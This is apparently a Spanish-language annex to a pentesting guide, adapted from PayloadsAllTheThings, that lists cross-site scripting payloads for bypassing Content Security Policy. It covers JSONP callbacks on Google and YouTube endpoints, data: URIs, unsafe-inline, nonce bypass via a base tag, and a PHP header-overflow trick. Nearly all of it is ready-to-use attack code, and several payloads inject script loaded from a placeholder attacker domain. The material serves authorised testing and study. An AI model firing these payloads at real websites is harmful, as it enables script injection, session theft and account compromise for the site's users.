# Cross-Site Scripting (XSS): anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [XSS Injection/4 - CSP Bypass.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/XSS%20Injection/4%20-%20CSP%20Bypass.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Evasión de CSP / Evasión CSP Usando JSONP

```js
<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
```

### Variantes presentes en tablas o texto del apartado

```text
script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
//google.com/complete/search?client=chrome&jsonp=alert(1);
https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)
https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();
https://www.youtube.com/oembed?callback=alert;
```

## 2. Evasión de CSP / Evasión CSP default-src

```js
script=document.createElement('script');
script.src='//[ATTACKER.DOMAIN.TLD]/csp.js';
window.frames[0].document.head.appendChild(script);
```

### Variantes presentes en tablas o texto del apartado

```text
Content-Security-Policy: default-src 'self' 'unsafe-inline';
http://example.lab/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//[ATTACKER.DOMAIN.TLD]/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;
```

## 3. Evasión de CSP / Evasión CSP inline eval

```js
d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[ATTACKER.DOMAIN.TLD]";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
```

## 4. Evasión de CSP / Evasión CSP script-src self

```js
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

### Variantes presentes en tablas o texto del apartado

```text
script-src self
```

## 5. Evasión de CSP / Evasión CSP script-src Datos

```javascript
<script src="data:,alert(1)">/</script>
```

### Variantes presentes en tablas o texto del apartado

```text
script-src 'self' data:
```

## 6. Evasión de CSP / Evasión CSP unsafe-inline

```javascript
"/><script>alert(1);</script>
```

### Variantes presentes en tablas o texto del apartado

```text
script-src https://google.com 'unsafe-inline';
```

## 7. Evasión de CSP / Evasión CSP nonce

```html
  <base href=http://[ATTACKER.DOMAIN.TLD]>
```

```ps1
  http://[ATTACKER.DOMAIN.TLD]/PATH.js
```

### Variantes presentes en tablas o texto del apartado

```text
script-src 'nonce-RANDOM_NONCE'
<script src='/PATH.js'></script>
```

## 8. Evasión de CSP / Evasión CSP Cabecera sent by PHP

```ps1
GET /?xss=<script>alert(1)</script>&a&a&a&a&a&a&a&a...[REPEATED &a 1000 times]&a&a&a&a
```

### Variantes presentes en tablas o texto del apartado

```text
header()
php:apache
PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in Unknown on line 0
Cannot modify header information - headers already sent in /var/www/html/index.php on line 2
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
